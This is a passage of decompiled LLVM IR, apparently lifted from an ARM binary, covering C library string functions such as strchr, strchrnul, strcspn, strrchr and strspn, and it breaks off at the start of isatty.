  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 2, 9, 3, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 24, 25, 4, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 7, 1, 9, 2, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 4, 21, 22, 23, 3, 24, 6, 25, 0, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 6, 7, 1, 9, 2, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 5, 22, 23, 24, 25, 26, 4, 27, 3, 28, 0, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_16ac0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16988, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_16914, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_168d8, { 1, 0 }
  uselistorder label %dec_label_pc_168c4, { 1, 0 }
  uselistorder label %dec_label_pc_16884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16818, { 2, 0, 1 }
  uselistorder label %dec_label_pc_167ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1674c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1671c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_166b8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16678, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_16ae4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_16ae4 = phi i32 [ %v0_16ae4.pre, %bb ], [ %v5_16ae4, %bb3 ]
  %v0_16ae0 = phi i32 [ %tmp, %bb ], [ %v5_16ae0, %bb3 ]
  %v1_16ae0 = inttoptr i32 %v0_16ae0 to i8*
  %v2_16ae0 = load i8, i8* %v1_16ae0, align 1
  %v1_16ae4 = inttoptr i32 %v0_16ae4 to i8*
  %v2_16ae4 = load i8, i8* %v1_16ae4, align 1
  %v3_16ae4 = zext i8 %v2_16ae4 to i32
  %v2_16ae8 = icmp eq i8 %v2_16ae0, 0
  br i1 %v2_16ae8, label %.dec_label_pc_16af4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_16ae4 = add i32 %v0_16ae4, 1
  %v5_16ae0 = add i32 %v0_16ae0, 1
  %v3_16ae0 = zext i8 %v2_16ae0 to i32
  %v10_16aec = icmp eq i8 %v2_16ae0, %v2_16ae4
  br i1 %v10_16aec, label %entry, label %dec_label_pc_16af4

.dec_label_pc_16af4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16af4

dec_label_pc_16af4:                               ; preds = %bb3, %.dec_label_pc_16af4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_16af4_crit_edge ], [ %v3_16ae0, %bb3 ]
  %v2_16af4.pre-phi = sub nsw i32 %.pn, %v3_16ae4
  ret i32 %v2_16af4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_16ae0, { 0, 2, 1 }
  uselistorder i32 %v0_16ae0, { 1, 0 }
  uselistorder i32 %v0_16ae4, { 1, 0 }
  uselistorder label %dec_label_pc_16af4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16b64 = urem i32 %arg1, 256
  %v0_16b843 = load i32, i32* @r0, align 4
  %v1_16b844 = urem i32 %v0_16b843, 4
  %v2_16b845 = icmp eq i32 %v1_16b844, 0
  br i1 %v2_16b845, label %dec_label_pc_16b8c, label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %entry, %dec_label_pc_16b80
  %v0_16b80 = phi i32 [ %v1_16b80, %dec_label_pc_16b80 ], [ %v0_16b843, %entry ]
  %v1_16b6c = inttoptr i32 %v0_16b80 to i8*
  %v2_16b6c = load i8, i8* %v1_16b6c, align 1
  %v3_16b6c = zext i8 %v2_16b6c to i32
  %v9_16b70 = icmp eq i32 %v3_16b6c, %v1_16b64
  br i1 %v9_16b70, label %dec_label_pc_16c40, label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b6c
  %v2_16b78 = icmp eq i8 %v2_16b6c, 0
  br i1 %v2_16b78, label %dec_label_pc_16c3c, label %dec_label_pc_16b80

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b78
  %v1_16b80 = add i32 %v0_16b80, 1
  %v1_16b84 = urem i32 %v1_16b80, 4
  %v2_16b84 = icmp eq i32 %v1_16b84, 0
  br i1 %v2_16b84, label %dec_label_pc_16b8c, label %dec_label_pc_16b6c

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b80, %entry
  %v0_16b90 = phi i32 [ %v0_16b843, %entry ], [ %v1_16b80, %dec_label_pc_16b80 ]
  %v4_16b8c = mul nuw nsw i32 %v1_16b64, 256
  %v5_16b8c = or i32 %v4_16b8c, %v1_16b64
  %v4_16b94 = mul i32 %v5_16b8c, 65536
  %v5_16b94 = or i32 %v4_16b94, %v5_16b8c
  br label %dec_label_pc_16b98

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16c34, %dec_label_pc_16bd4, %dec_label_pc_16b8c
  %v0_16bfc = phi i32 [ %v0_16b90, %dec_label_pc_16b8c ], [ %v4_16b98, %dec_label_pc_16bd4 ], [ %v4_16b98, %dec_label_pc_16c34 ]
  %v1_16b98 = inttoptr i32 %v0_16bfc to i32*
  %v2_16b98 = load i32, i32* %v1_16b98, align 4
  %v4_16b98 = add i32 %v0_16bfc, 4
  %v2_16ba0 = xor i32 %v2_16b98, %v5_16b94
  %v2_16bac = add i32 %v2_16b98, 2130640639
  %v1_16bb0 = sub i32 -1, %v2_16b98
  %v2_16bb4 = xor i32 %v2_16bac, %v1_16bb0
  %v2_16bc0 = and i32 %v2_16bb4, -2130640640
  store i32 %v2_16bc0, i32* @r1, align 4
  %v2_16bc8 = icmp eq i32 %v2_16bc0, 0
  br i1 %v2_16bc8, label %dec_label_pc_16bd4, label %dec_label_pc_16bdc

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16b98
  %v2_16ba4 = add i32 %v2_16ba0, 2130640639
  %v1_16bbc = sub i32 -1, %v2_16ba0
  %v2_16bc4 = xor i32 %v2_16ba4, %v1_16bbc
  %v2_16bcc = and i32 %v2_16bc4, -2130640640
  %v2_16bd4 = icmp eq i32 %v2_16bcc, 0
  br i1 %v2_16bd4, label %dec_label_pc_16b98, label %dec_label_pc_16bdc

dec_label_pc_16bdc:                               ; preds = %dec_label_pc_16b98, %dec_label_pc_16bd4
  %v2_16bdc = inttoptr i32 %v0_16bfc to i8*
  %v3_16bdc = load i8, i8* %v2_16bdc, align 1
  %v4_16bdc = zext i8 %v3_16bdc to i32
  %v9_16be0 = icmp eq i32 %v4_16bdc, %v1_16b64
  br i1 %v9_16be0, label %dec_label_pc_16c40, label %dec_label_pc_16bec

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bdc
  %v2_16bec = icmp eq i8 %v3_16bdc, 0
  br i1 %v2_16bec, label %dec_label_pc_16c3c, label %dec_label_pc_16bf4

dec_label_pc_16bf4:                               ; preds = %dec_label_pc_16bec
  %v1_16bf4 = add i32 %v0_16bfc, 1
  %v2_16bf4 = inttoptr i32 %v1_16bf4 to i8*
  %v3_16bf4 = load i8, i8* %v2_16bf4, align 1
  %v4_16bf4 = zext i8 %v3_16bf4 to i32
  %v9_16bf8 = icmp eq i32 %v4_16bf4, %v1_16b64
  br i1 %v9_16bf8, label %dec_label_pc_16c40, label %dec_label_pc_16c04

dec_label_pc_16c04:                               ; preds = %dec_label_pc_16bf4
  %v2_16c04 = icmp eq i8 %v3_16bf4, 0
  br i1 %v2_16c04, label %dec_label_pc_16c3c, label %dec_label_pc_16c0c

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16c04
  %v1_16c0c = add i32 %v0_16bfc, 2
  %v2_16c0c = inttoptr i32 %v1_16c0c to i8*
  %v3_16c0c = load i8, i8* %v2_16c0c, align 1
  %v4_16c0c = zext i8 %v3_16c0c to i32
  %v9_16c10 = icmp eq i32 %v4_16c0c, %v1_16b64
  br i1 %v9_16c10, label %dec_label_pc_16c40, label %dec_label_pc_16c1c

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16c0c
  %v2_16c1c = icmp eq i8 %v3_16c0c, 0
  br i1 %v2_16c1c, label %dec_label_pc_16c3c, label %dec_label_pc_16c24

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16c1c
  %v1_16c24 = add i32 %v0_16bfc, 3
  %v2_16c24 = inttoptr i32 %v1_16c24 to i8*
  %v3_16c24 = load i8, i8* %v2_16c24, align 1
  %v4_16c24 = zext i8 %v3_16c24 to i32
  %v9_16c28 = icmp eq i32 %v4_16c24, %v1_16b64
  br i1 %v9_16c28, label %dec_label_pc_16c40, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c24
  %v2_16c34 = icmp eq i8 %v3_16c24, 0
  br i1 %v2_16c34, label %dec_label_pc_16c3c, label %dec_label_pc_16b98

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16b78, %dec_label_pc_16c34, %dec_label_pc_16c1c, %dec_label_pc_16c04, %dec_label_pc_16bec
  br label %dec_label_pc_16c40

dec_label_pc_16c40:                               ; preds = %dec_label_pc_16b6c, %dec_label_pc_16c24, %dec_label_pc_16c0c, %dec_label_pc_16bf4, %dec_label_pc_16bdc, %dec_label_pc_16c3c
  %v1_16c44 = phi i32 [ 0, %dec_label_pc_16c3c ], [ %v1_16c24, %dec_label_pc_16c24 ], [ %v1_16c0c, %dec_label_pc_16c0c ], [ %v1_16bf4, %dec_label_pc_16bf4 ], [ %v0_16bfc, %dec_label_pc_16bdc ], [ %v0_16b80, %dec_label_pc_16b6c ]
  ret i32 %v1_16c44

; uselistorder directives
  uselistorder i32 %v4_16b98, { 1, 0 }
  uselistorder i32 %v2_16b98, { 0, 2, 1 }
  uselistorder i32 %v0_16bfc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_16b8c, { 1, 0 }
  uselistorder i32 %v1_16b80, { 1, 0, 2 }
  uselistorder i32 %v0_16b843, { 2, 1, 0 }
  uselistorder i32 %v1_16b64, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_16c40, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16c3c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16bdc, { 1, 0 }
  uselistorder label %dec_label_pc_16b6c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16c54 = urem i32 %arg1, 256
  %v0_16c742 = load i32, i32* @r0, align 4
  %v1_16c743 = urem i32 %v0_16c742, 4
  %v2_16c744 = icmp eq i32 %v1_16c743, 0
  br i1 %v2_16c744, label %dec_label_pc_16c7c, label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %entry, %dec_label_pc_16c70
  %v0_16c70 = phi i32 [ %v1_16c70, %dec_label_pc_16c70 ], [ %v0_16c742, %entry ]
  %v1_16c5c = inttoptr i32 %v0_16c70 to i8*
  %v2_16c5c = load i8, i8* %v1_16c5c, align 1
  %v3_16c5c = zext i8 %v2_16c5c to i32
  %v9_16c60 = icmp eq i32 %v3_16c5c, %v1_16c54
  br i1 %v9_16c60, label %dec_label_pc_16d2c, label %dec_label_pc_16c68

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c5c
  %v2_16c68 = icmp eq i8 %v2_16c5c, 0
  br i1 %v2_16c68, label %dec_label_pc_16d2c, label %dec_label_pc_16c70

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c68
  %v1_16c70 = add i32 %v0_16c70, 1
  %v1_16c74 = urem i32 %v1_16c70, 4
  %v2_16c74 = icmp eq i32 %v1_16c74, 0
  br i1 %v2_16c74, label %dec_label_pc_16c7c, label %dec_label_pc_16c5c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16c70, %entry
  %v0_16c80 = phi i32 [ %v0_16c742, %entry ], [ %v1_16c70, %dec_label_pc_16c70 ]
  %v4_16c7c = mul nuw nsw i32 %v1_16c54, 256
  %v5_16c7c = or i32 %v4_16c7c, %v1_16c54
  %v4_16c84 = mul i32 %v5_16c7c, 65536
  %v5_16c84 = or i32 %v4_16c84, %v5_16c7c
  br label %dec_label_pc_16c88

dec_label_pc_16c88:                               ; preds = %dec_label_pc_16d24, %dec_label_pc_16cc4, %dec_label_pc_16c7c
  %v0_16cec = phi i32 [ %v0_16c80, %dec_label_pc_16c7c ], [ %v4_16c88, %dec_label_pc_16cc4 ], [ %v4_16c88, %dec_label_pc_16d24 ]
  %v1_16c88 = inttoptr i32 %v0_16cec to i32*
  %v2_16c88 = load i32, i32* %v1_16c88, align 4
  %v4_16c88 = add i32 %v0_16cec, 4
  %v2_16c90 = xor i32 %v2_16c88, %v5_16c84
  %v2_16c9c = add i32 %v2_16c88, 2130640639
  %v1_16ca0 = sub i32 -1, %v2_16c88
  %v2_16ca4 = xor i32 %v2_16c9c, %v1_16ca0
  %v2_16cb0 = and i32 %v2_16ca4, -2130640640
  store i32 %v2_16cb0, i32* @r1, align 4
  %v2_16cb8 = icmp eq i32 %v2_16cb0, 0
  br i1 %v2_16cb8, label %dec_label_pc_16cc4, label %dec_label_pc_16ccc

dec_label_pc_16cc4:                               ; preds = %dec_label_pc_16c88
  %v2_16c94 = add i32 %v2_16c90, 2130640639
  %v1_16cac = sub i32 -1, %v2_16c90
  %v2_16cb4 = xor i32 %v2_16c94, %v1_16cac
  %v2_16cbc = and i32 %v2_16cb4, -2130640640
  %v2_16cc4 = icmp eq i32 %v2_16cbc, 0
  br i1 %v2_16cc4, label %dec_label_pc_16c88, label %dec_label_pc_16ccc

dec_label_pc_16ccc:                               ; preds = %dec_label_pc_16c88, %dec_label_pc_16cc4
  %v2_16ccc = inttoptr i32 %v0_16cec to i8*
  %v3_16ccc = load i8, i8* %v2_16ccc, align 1
  %v4_16ccc = zext i8 %v3_16ccc to i32
  %v9_16cd0 = icmp eq i32 %v4_16ccc, %v1_16c54
  br i1 %v9_16cd0, label %dec_label_pc_16d2c, label %dec_label_pc_16cdc

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16ccc
  %v2_16cdc = icmp eq i8 %v3_16ccc, 0
  br i1 %v2_16cdc, label %dec_label_pc_16d2c, label %dec_label_pc_16ce4

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cdc
  %v1_16ce4 = add i32 %v0_16cec, 1
  %v2_16ce4 = inttoptr i32 %v1_16ce4 to i8*
  %v3_16ce4 = load i8, i8* %v2_16ce4, align 1
  %v4_16ce4 = zext i8 %v3_16ce4 to i32
  %v9_16ce8 = icmp eq i32 %v4_16ce4, %v1_16c54
  br i1 %v9_16ce8, label %dec_label_pc_16d2c, label %dec_label_pc_16cf4

dec_label_pc_16cf4:                               ; preds = %dec_label_pc_16ce4
  %v2_16cf4 = icmp eq i8 %v3_16ce4, 0
  br i1 %v2_16cf4, label %dec_label_pc_16d2c, label %dec_label_pc_16cfc

dec_label_pc_16cfc:                               ; preds = %dec_label_pc_16cf4
  %v1_16cfc = add i32 %v0_16cec, 2
  %v2_16cfc = inttoptr i32 %v1_16cfc to i8*
  %v3_16cfc = load i8, i8* %v2_16cfc, align 1
  %v4_16cfc = zext i8 %v3_16cfc to i32
  %v9_16d00 = icmp eq i32 %v4_16cfc, %v1_16c54
  br i1 %v9_16d00, label %dec_label_pc_16d2c, label %dec_label_pc_16d0c

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cfc
  %v2_16d0c = icmp eq i8 %v3_16cfc, 0
  br i1 %v2_16d0c, label %dec_label_pc_16d2c, label %dec_label_pc_16d14

dec_label_pc_16d14:                               ; preds = %dec_label_pc_16d0c
  %v1_16d14 = add i32 %v0_16cec, 3
  %v2_16d14 = inttoptr i32 %v1_16d14 to i8*
  %v3_16d14 = load i8, i8* %v2_16d14, align 1
  %v4_16d14 = zext i8 %v3_16d14 to i32
  %v9_16d18 = icmp eq i32 %v4_16d14, %v1_16c54
  br i1 %v9_16d18, label %dec_label_pc_16d2c, label %dec_label_pc_16d24

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d14
  %v2_16d24 = icmp eq i8 %v3_16d14, 0
  br i1 %v2_16d24, label %dec_label_pc_16d2c, label %dec_label_pc_16c88

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16c68, %dec_label_pc_16c5c, %dec_label_pc_16d24, %dec_label_pc_16d14, %dec_label_pc_16d0c, %dec_label_pc_16cfc, %dec_label_pc_16cf4, %dec_label_pc_16ce4, %dec_label_pc_16cdc, %dec_label_pc_16ccc
  %v1_16d30 = phi i32 [ %v1_16d14, %dec_label_pc_16d24 ], [ %v1_16d14, %dec_label_pc_16d14 ], [ %v1_16cfc, %dec_label_pc_16d0c ], [ %v1_16cfc, %dec_label_pc_16cfc ], [ %v1_16ce4, %dec_label_pc_16cf4 ], [ %v1_16ce4, %dec_label_pc_16ce4 ], [ %v0_16cec, %dec_label_pc_16cdc ], [ %v0_16cec, %dec_label_pc_16ccc ], [ %v0_16c70, %dec_label_pc_16c5c ], [ %v0_16c70, %dec_label_pc_16c68 ]
  ret i32 %v1_16d30

; uselistorder directives
  uselistorder i32 %v4_16c88, { 1, 0 }
  uselistorder i32 %v2_16c88, { 0, 2, 1 }
  uselistorder i32 %v0_16cec, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_16c7c, { 1, 0 }
  uselistorder i32 %v1_16c70, { 1, 0, 2 }
  uselistorder i32 %v0_16c742, { 2, 1, 0 }
  uselistorder i32 %v1_16c54, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_16d2c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_16ccc, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_16d3c = load i32, i32* @r4, align 4
  store i32 %v3_16d3c, i32* %stack_var_-16, align 4
  %v6_16d3c = load i32, i32* @r5, align 4
  %v9_16d3c = load i32, i32* @r6, align 4
  %v0_16d40 = load i32, i32* @r0, align 4
  %v0_16d44 = load i32, i32* @r1, align 4
  store i32 %v0_16d44, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_16d608 = inttoptr i32 %v0_16d40 to i8*
  %v2_16d609 = load i8, i8* %v1_16d608, align 1
  %v3_16d6010 = zext i8 %v2_16d609 to i32
  store i32 %v3_16d6010, i32* @r1, align 4
  %v2_16d6411 = icmp eq i8 %v2_16d609, 0
  store i32 %v0_16d44, i32* @r0, align 4
  %v1_16d6c12 = add i32 %v0_16d40, 1
  store i32 %v1_16d6c12, i32* @r4, align 4
  br i1 %v2_16d6411, label %dec_label_pc_16d74, label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %entry, %dec_label_pc_16d5c
  %v3_16d6014 = phi i32 [ %v3_16d60, %dec_label_pc_16d5c ], [ %v3_16d6010, %entry ]
  %v0_16d6813 = phi i32 [ %v0_16d68.pre, %dec_label_pc_16d5c ], [ %v0_16d44, %entry ]
  %v2_16d50 = call i32 @__GI_strchr(i32 %v0_16d6813, i32 %v3_16d6014)
  %v2_16d54 = icmp eq i32 %v2_16d50, 0
  %v0_16d5c = load i32, i32* @r5, align 4
  br i1 %v2_16d54, label %dec_label_pc_16d5c, label %dec_label_pc_16d74

dec_label_pc_16d5c:                               ; preds = %dec_label_pc_16d50
  %v1_16d5c = add i32 %v0_16d5c, 1
  %v0_16d60.pre = load i32, i32* @r4, align 4
  %v0_16d68.pre = load i32, i32* @r6, align 4
  store i32 %v1_16d5c, i32* @r5, align 4
  %v1_16d60 = inttoptr i32 %v0_16d60.pre to i8*
  %v2_16d60 = load i8, i8* %v1_16d60, align 1
  %v3_16d60 = zext i8 %v2_16d60 to i32
  store i32 %v3_16d60, i32* @r1, align 4
  %v2_16d64 = icmp eq i8 %v2_16d60, 0
  store i32 %v0_16d68.pre, i32* @r0, align 4
  %v1_16d6c = add i32 %v0_16d60.pre, 1
  store i32 %v1_16d6c, i32* @r4, align 4
  br i1 %v2_16d64, label %dec_label_pc_16d74, label %dec_label_pc_16d50

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d5c, %dec_label_pc_16d50, %entry
  %v0_16d74 = phi i32 [ 0, %entry ], [ %v0_16d5c, %dec_label_pc_16d50 ], [ %v1_16d5c, %dec_label_pc_16d5c ]
  %v2_16d78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d78, i32* @r4, align 4
  store i32 %v6_16d3c, i32* @r5, align 4
  store i32 %v9_16d3c, i32* @r6, align 4
  ret i32 %v0_16d74

; uselistorder directives
  uselistorder i32 %v3_16d60, { 1, 0 }
  uselistorder i32 %v0_16d68.pre, { 1, 0 }
  uselistorder i32 %v0_16d60.pre, { 1, 0 }
  uselistorder label %dec_label_pc_16d50, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_16d84 = urem i32 %arg2, 256
  store i32 %v1_16d84, i32* @r4, align 4
  %v2_16d84 = icmp eq i32 %v1_16d84, 0
  br i1 %v2_16d84, label %dec_label_pc_16d98, label %dec_label_pc_16dac.preheader

dec_label_pc_16dac.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_16db43 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_16d84)
  %v2_16db85 = icmp eq i32 %v2_16db43, 0
  br i1 %v2_16db85, label %dec_label_pc_16dc0, label %dec_label_pc_16da4

dec_label_pc_16d98:                               ; preds = %entry
  %v2_16d9c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_16dc4

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16dac.preheader, %dec_label_pc_16da4
  %v2_16db46 = phi i32 [ %v2_16db4, %dec_label_pc_16da4 ], [ %v2_16db43, %dec_label_pc_16dac.preheader ]
  store i32 %v2_16db46, i32* @r5, align 4
  %v1_16da8 = add i32 %v2_16db46, 1
  store i32 %v1_16da8, i32* @r0, align 4
  %v0_16db0 = load i32, i32* @r4, align 4
  %v2_16db4 = call i32 @__GI_strchr(i32 %v1_16da8, i32 %v0_16db0)
  %v2_16db8 = icmp eq i32 %v2_16db4, 0
  br i1 %v2_16db8, label %dec_label_pc_16dc0, label %dec_label_pc_16da4

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16da4, %dec_label_pc_16dac.preheader
  %v0_16dc0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_16dc4

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16d98, %dec_label_pc_16dc0
  %storemerge = phi i32 [ %v2_16d9c, %dec_label_pc_16d98 ], [ %v0_16dc0, %dec_label_pc_16dc0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_16db4, { 1, 0 }
  uselistorder i32 %v1_16da8, { 1, 0 }
  uselistorder i32 %v1_16d84, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16dc4, { 1, 0 }
  uselistorder label %dec_label_pc_16da4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_16e002 = load i32, i32* @r0, align 4
  %v1_16e003 = inttoptr i32 %v0_16e002 to i8*
  %v2_16e004 = load i8, i8* %v1_16e003, align 1
  %v2_16e046 = icmp eq i8 %v2_16e004, 0
  br i1 %v2_16e046, label %dec_label_pc_16e10, label %dec_label_pc_16de4.preheader

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16de4
  %v1_16dec = add i32 %v0_16dec, 1
  %v9_16ddc = icmp eq i8 %v0_16ddc10.in, %v2_16de4
  br i1 %v9_16ddc, label %dec_label_pc_16df8, label %dec_label_pc_16de4

dec_label_pc_16de4:                               ; preds = %dec_label_pc_16de4.preheader, %dec_label_pc_16ddc
  %v0_16dec = phi i32 [ %tmp, %dec_label_pc_16de4.preheader ], [ %v1_16dec, %dec_label_pc_16ddc ]
  %v1_16de4 = inttoptr i32 %v0_16dec to i8*
  %v2_16de4 = load i8, i8* %v1_16de4, align 1
  %v2_16de8 = icmp eq i8 %v2_16de4, 0
  br i1 %v2_16de8, label %dec_label_pc_16e10, label %dec_label_pc_16ddc

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16ddc
  %v1_16df8 = add i32 %v0_16df8, 1
  %v1_16dfc = add i32 %v0_16dfc, 1
  %v1_16e00 = inttoptr i32 %v1_16dfc to i8*
  %v2_16e00 = load i8, i8* %v1_16e00, align 1
  %v2_16e04 = icmp eq i8 %v2_16e00, 0
  br i1 %v2_16e04, label %dec_label_pc_16e10, label %dec_label_pc_16de4.preheader

dec_label_pc_16de4.preheader:                     ; preds = %entry, %dec_label_pc_16df8
  %v0_16dfc = phi i32 [ %v1_16dfc, %dec_label_pc_16df8 ], [ %v0_16e002, %entry ]
  %v0_16df8 = phi i32 [ %v1_16df8, %dec_label_pc_16df8 ], [ 0, %entry ]
  %v0_16ddc10.in = phi i8 [ %v2_16e00, %dec_label_pc_16df8 ], [ %v2_16e004, %entry ]
  br label %dec_label_pc_16de4

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16df8, %dec_label_pc_16de4, %entry
  %v0_16e10 = phi i32 [ 0, %entry ], [ %v0_16df8, %dec_label_pc_16de4 ], [ %v1_16df8, %dec_label_pc_16df8 ]
  ret i32 %v0_16e10

; uselistorder directives
  uselistorder i8 %v2_16de4, { 1, 0 }
  uselistorder i32 %v0_16dec, { 1, 0 }
  uselistorder label %dec_label_pc_16de4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
